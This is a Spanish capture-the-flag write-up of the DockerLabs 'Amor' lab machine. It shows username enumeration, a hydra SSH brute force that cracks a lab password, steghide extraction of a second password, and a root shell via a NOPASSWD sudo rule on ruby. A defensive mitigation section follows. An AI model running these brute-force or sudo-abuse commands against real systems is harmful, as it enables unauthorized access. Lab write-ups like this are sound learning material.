# DockerLabs - Amor

> [!abstract] Resumen
> Máquina Linux que expone un servicio web con una lista de posibles usuarios del sistema. Mediante un ataque de fuerza bruta sobre SSH se obtiene acceso como `carlota`. La enumeración local permite identificar al usuario `oscar`, y tras aplicar esteganografía sobre una imagen en el home se obtienen sus credenciales. Finalmente, una mala configuración de `sudoers` que permite ejecutar `ruby` como `root` sin contraseña habilita la escalada total.

## Información de la Máquina

| Campo          | Valor      |
| :------------- | :--------- |
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil      |
| **SO**         | Linux      |
| **IP**         | 172.17.0.2 |

---

## Reconocimiento

### Escaneo de puertos

Se verificó la conectividad con el objetivo y se ejecutó `nmap` para identificar los servicios expuestos.

```bash
nmap -sC -sV -oA nmap/initial 172.17.0.2
```

![Escaneo de puertos con nmap](./img/01-nmap.png)

El único servicio relevante es el puerto 80, por lo que se procedió a inspeccionarlo desde el navegador.

### Enumeración web

![Enumeración del servicio web](./img/02-web-user-enum.png)

El sitio publicaba nombres de posibles usuarios del sistema, entre ellos `carlota` y `oscar`. Esa información es directamente aprovechable para un ataque de fuerza bruta contra SSH.

---

## Acceso Inicial

Con los nombres de usuario identificados, se lanzó un ataque de fuerza bruta contra el servicio SSH utilizando `hydra`.

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![Ataque de fuerza bruta con hydra](./img/03-hydra.png)

> [!success] Credenciales obtenidas
> ```text
> [ssh] host: 172.17.0.2   login: carlota   password: babygirl
> ```

Con las credenciales en mano se accedió vía SSH y se verificaron los grupos y permisos del usuario.

```bash
ssh carlota@172.17.0.2
id
```

![Acceso SSH como carlota](./img/04-ssh-carlota.png)

---

## Enumeración Post-Explotación

Ya dentro del sistema, se enumeró el archivo `/etc/passwd` para identificar otros usuarios.

```bash
cat /etc/passwd
```

![Enumeración de usuarios](./img/05-passwd.png)

Se identificó un segundo usuario: `oscar`. Sin sus credenciales no había forma de avanzar por ese lado, por lo que se procedió a revisar los directorios personales de `carlota`.

> [!note]- Desglose de comandos
> - `cat /etc/passwd`: muestra las cuentas registradas en el sistema, útil para identificar usuarios con shell válida.

---

## Credenciales de Oscar vía Esteganografía

Dentro de `/home/carlota/Desktop` se encontró una carpeta llamada `Vacaciones` con una imagen `imagen.jpg`. Se analizó con `steghide` en busca de contenido oculto.

```bash
steghide info imagen.jpg
```

![Análisis con steghide info](./img/06-steghide-info.png)

La herramienta confirmó la existencia de un archivo `secret.txt` embebido. Se procedió a extraerlo.

```bash
steghide extract -sf imagen.jpg
```

![Extracción del archivo oculto](./img/07-steghide-extract.png)

El archivo extraído contenía un string en Base64 que, al decodificarse, reveló la contraseña de `oscar`.

![Decodificación Base64](./img/08-base64-decode.png)

> [!success] Credenciales obtenidas
> ```text
> Usuario:  oscar
> Password: eslacasadepinypon
> ```

> [!note]- Desglose de comandos
> - `steghide`: herramienta de esteganografía que permite incrustar o extraer información en imágenes y audio.
> - `info`: subcomando que muestra si hay datos incrustados en el archivo portador.
> - `extract -sf`: extrae el contenido oculto especificando el archivo portador.

---

## Acceso como Oscar

Se reutilizaron las credenciales para acceder vía SSH.

```bash
ssh oscar@172.17.0.2
sudo -l
```

![Acceso SSH como oscar y permisos sudo](./img/09-ssh-oscar-sudo.png)

El resultado del `sudo -l` mostró una regla crítica:

```text
User oscar may run the following commands on 564fdd50fcd5:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Es decir, `oscar` puede ejecutar `ruby` como `root` sin contraseña. Antes de explotarlo, se revisaron los directorios en busca de más pistas.

```bash
ls /home/oscar
cat /home/oscar/Desktop/nota.txt
```

![Pista encontrada](./img/10-hint-root.png)

El archivo mencionaba revisar el escritorio de `root` en busca de un archivo de texto. Es decir, la flag final está en `/root/Desktop`.

---

## Escalada de Privilegios

Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/) se identificó la técnica para abusar de `ruby` cuando se ejecuta con privilegios elevados. Ruby permite invocar una shell heredando los privilegios del proceso padre.

```bash
sudo ruby -e 'exec "/bin/sh"'
```

![Obtención de shell como root](./img/11-ruby-root.png)

> [!note]- Desglose de comandos
> - `ruby`: intérprete del lenguaje Ruby.
> - `-e`: evalúa el código pasado como argumento.
> - `exec "/bin/sh"`: reemplaza el proceso actual por una shell `/bin/sh`, heredando sus privilegios.

---

## Flag

Ya como `root`, se accedió al directorio indicado por la pista para leer la flag final.

```bash
cat /root/Desktop/flag.txt
```

![Flag final obtenida](./img/12-root-flag.png)

> [!example] Flag Obtenida
> ```text
> <flag>
> ```

---

## Más Allá del Reto

> [!quote] Análisis Post-Explotación
> - **Lo que funcionó:** El ataque de fuerza bruta sobre SSH con `hydra` a partir de usuarios filtrados en la web, y el encadenamiento de `steghide` + Base64 para obtener las credenciales de `oscar`.
> - **Lo que falló:** Nada relevante. La ruta de explotación fue lineal.
> - **Herramientas nuevas:** `steghide` para análisis esteganográfico.
> - **Para la próxima:** Automatizar el análisis de esteganografía sobre imágenes encontradas en directorios de usuario.

---

## Mitigación

> [!shield] Recomendaciones Defensivas
> Contramedidas aplicables si este escenario fuera un entorno real.

### Exposición de usuarios en el servicio web

**Vulnerabilidad:** El sitio público en el puerto 80 revelaba nombres de usuarios válidos del sistema, facilitando ataques dirigidos.

**Mitigaciones:**
- No publicar nombres de usuario reales en servicios expuestos a Internet.
- Implementar autenticación multifactor para servicios críticos como SSH.
- Limitar los intentos de autenticación con herramientas como `fail2ban` o `sshguard`.
- Aplicar políticas de contraseñas robustas y rotación periódica.

### Contraseña débil en SSH

**Vulnerabilidad:** El usuario `carlota` utilizaba una contraseña presente en diccionarios comunes (`babygirl`), permitiendo un ataque de fuerza bruta exitoso.

**Mitigaciones:**
- Deshabilitar la autenticación por contraseña en SSH (`PasswordAuthentication no`) y usar exclusivamente claves públicas.
- Forzar complejidad y longitud mínima de contraseñas mediante PAM o políticas de dominio.
- Bloquear IPs tras N intentos fallidos.

### Información sensible oculta con esteganografía

**Vulnerabilidad:** Se almacenaron credenciales en un archivo oculto dentro de una imagen en el home de un usuario.

**Mitigaciones:**
- No almacenar credenciales ni secretos en archivos dentro de directorios personales.
- Utilizar gestores de secretos (Vault, KeePass, `pass`) para credenciales sensibles.
- Auditar periódicamente los directorios de usuario en busca de archivos sospechosos.

### Configuración insegura de sudoers

**Vulnerabilidad:** La regla `(ALL) NOPASSWD: /usr/bin/ruby` permitía a `oscar` ejecutar código arbitrario como `root` mediante `ruby -e`.

**Mitigaciones:**
- Remover permisos `sudo` sobre intérpretes de lenguajes (`ruby`, `python`, `perl`, `node`) y binarios interactivos (`vim`, `less`, `more`, `find`).
- Aplicar el principio de privilegio mínimo: otorgar `sudo` solo sobre comandos específicos y con argumentos restringidos.
- Auditar periódicamente el archivo `/etc/sudoers` y los archivos en `/etc/sudoers.d/`.
- Consultar [GTFOBins](https://gtfobins.github.io/) antes de delegar cualquier binario vía `sudo`.

> [!tip] Defensa en Profundidad
> La combinación de controles preventivos (mínimo privilegio, sanitización), detectivos (auditoría de sudoers, `fail2ban`) y correctivos (rotación de credenciales, parcheo) es lo que realmente reduce la superficie de ataque.

---

## Referencias

- [GTFOBins - ruby](https://gtfobins.github.io/gtfobins/ruby/)
- [Steghide - Documentación oficial](https://steghide.sourceforge.net/documentation.php)
- [HackTricks - Brute Force](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
